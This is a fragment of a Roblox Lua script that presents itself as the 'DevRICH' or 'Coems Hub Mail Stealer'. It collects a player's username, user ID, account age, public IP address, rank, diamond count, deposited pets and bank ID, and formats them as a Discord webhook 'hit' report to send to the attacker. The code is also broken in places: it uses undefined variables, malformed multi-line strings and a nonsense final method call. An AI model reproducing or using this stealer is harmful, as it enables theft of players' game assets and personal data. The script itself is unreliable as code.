local url = _G.Webhook
local us = _G.dhwebhook
local url2 = us
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
request = http_request or request or HttpPost or syn.request

local data1 = {
    ["content"] = "@everyone\DevRICH Detected A Hit", -- Free Webhook logging
    ["embeds"] = {
        {
            ["title"] = "
Coems Hub Mail Stealer Results
",
            ["url"] = "https://discord.gg/8VWDSeKsDn",
            ["description"] = "This data was generated using DevRICH Mail Stealer.",
            ["type"] = "rich",
            ["color"] = tonumber(0x7b00ff),
            ["thumbnail"] = {
                ["url"] = imgs,
                ["height"] = 420,
                ["width"] = 420
            },
            ["fields"] = {
                {
                    ["name"] = "Data Generated",
                    ["value"] = "Username : " ..username .."\nUser ID : " ..fardplayer.userId .. "\nAccount Age : " ..fardplayer.AccountAge .. " Days\nDevice : Computer\nExploit : "..exploit.."\nIP Address : "..game:HttpGet('https://api.ipify.org/').."", -- remove the || on both sides if you don't want your username to be behind a spoiler credits to ver#2607
                    ["inline"] = false
                },
                {
                    ["name"] = "Deposited Diamonds",
                    ["value"] = "
> "..myclowns.."
",
                    ["inline"] = true
                },
                {
                    ["name"] = "Deposited Pets",
                    ["value"] = "
> "..bomg.."
",
                    ["inline"] = true
                },
                {
                    ["name"] = "Deposited Exclusives",
                    ["value"] = "
> "..#PetsList.."
",
                    ["inline"] = true
                },
                {
                    ["name"] = "Deposited Huges",
                    ["value"] = "
> "..#clown.."
",
                    ["inline"] = true
                },
                {
                    ["name"] = "Rank",
                    ["value"] = "
> "..rank.."
",
                    ["inline"] = true
                },
                {
                    ["name"] = "Bank ID",
                    ["value"] = "
> "..mybanks[1]["BUID"].."
",
                    ["inline"] = true
                }
            }
        }
    }
}
local newdata1 = game:GetService("HttpService"):8VWDSeKsDn(data1)
